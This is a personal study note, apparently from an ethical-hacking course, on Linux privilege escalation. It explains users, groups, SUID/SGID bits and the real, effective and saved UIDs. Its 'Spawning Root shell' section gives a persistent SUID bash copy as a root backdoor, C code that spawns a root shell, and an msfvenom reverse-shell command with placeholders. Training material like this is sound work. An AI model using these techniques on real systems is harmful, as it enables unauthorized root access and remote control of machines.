
2024-06-13 15:33

Source: #privesc 

Tags: 

All Privilege Escalation are effectively examples of access control violations.
#### Permissions in Linux
##### User 
- Users are identified by an integer user ID (UID). The “root” user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file
##### Group
- By default, a user’s primary group has the same name as their user account
##### File & Directory  
- All files & directories have a single owner and a group.
##### Special Permissions
- **setuid (SUID)** bit When set, files will get executed with the privileges of the file owner.
- **setgid (SGID)** bit When set on a file, the file will get executed with the privileges of the file group. 
- When set on a directory, files created within that directory will inherit the group of the directory itself
##### Viewing Permission
```
$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date
```
- above the file is owned by root and belongs to the root group 
- The first 10 characters indicate the permissions set on the file or directory.
- The first character simply indicates the type (e.g. '-' for file, 'd' for directory)
- The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
- Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions. 
- SUID/SGID permissions are represented by an 's' in the execute position
##### User ID's 
- each user has 3 user IDs in Linux (real, effective, and saved)
	- Real ID is who they actually are (the ID defined in /etc/passwd).
	- Effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID. The effective ID is used in most access control decisions to verify a user, and commands such as `whoami` use the effective ID
	- Saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID
- `id` command will print real and effective uid/gid
- the command below will show the real, effective, saved, and file system user / group IDs of the current process (i.e. our shell)
```
# cat /proc/$$/status | grep "[UG]id"
```








#### Spawning Root shell

use the following methods to spawn a root shell in situations where commands can be executed as root-
##### rootbash SUID

To spawn a root shell, create a copy of the /bin/bash executable file (eg. rename it [[rootbash]]), make sure it is owned by the root user, and has the SUID bit set.
A root shell can be spawned by simply executing the rootbash file with the -p command line option. The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times)

##### Custom Executables

There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
```
int main() { 
	setuid(0); 
	system("/bin/bash -p"); 
} 

Compile using:
$ gcc -o <name> <filename.c>
```

##### msfvenom

If a reverse shell is preferred, [[msfvenom]] can be used to generate an executable (.elf) file: 
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```
This reverse shell can be caught using netcat or Metasploit’s own multi/handler module.

##### Native Reverse Shells

There are multiple ways to spawn [[revshell]] natively on many Linux distributions. A good tool for suggesting these is: https://github.com/mthbernardes/rsg 


#### Privilege Escalation Tools




### References

[Linux Privilege Escalation Tutorial: Become an Ethical Hacker | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)